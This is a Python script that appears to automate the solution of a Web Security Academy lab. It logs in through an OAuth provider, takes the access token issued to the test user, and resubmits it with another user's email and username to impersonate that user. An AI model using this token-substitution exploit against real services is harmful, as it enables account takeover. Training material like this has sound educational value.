from web_security_academy.core.logger import logger
from urllib.parse import urljoin
from bs4 import BeautifulSoup

import re


def solve_lab(session):
    # Extract / visit social media URL
    resp = session.get_path("/social-login")
    soup = BeautifulSoup(resp.text, "lxml")
    meta = soup.select_one('meta[http-equiv="refresh"]')
    social_url = meta.get("content")[6:]
    logger.info(f"Social media URL: {urljoin(social_url, '/')}")
    resp = session.get(social_url)

    # Log in
    soup = BeautifulSoup(resp.text, "lxml")
    login_path = soup.select_one("form.login-form").get("action")
    data = {"username": "wiener", "password": "peter"}
    resp = session.post(urljoin(social_url, login_path), data=data)
    logger.info('Logged into social media as "wiener"')

    # Allow lab access to profile + email, and extract access token
    soup = BeautifulSoup(resp.text, "lxml")
    oauth_path = soup.select_one("form").get("action")
    resp = session.post(urljoin(social_url, oauth_path))
    token = re.search(r"access_token=([^&]+)", resp.url).group(1)
    logger.info(f"Access token: {token}")

    # Explanation: Since the lab server doesn't propertly check that the access
    # token matches other data in the authentication request, we can change the
    # parameters sent to the server to impersonate Carlos.

    json = {
        "email": "carlos@carlos-montoya.net",
        "username": "carlos",
        "token": token,
    }
    session.post_path("/authenticate", json=json)
    logger.info("Authenticated to lab with the following JSON:")
    logger.info(json)
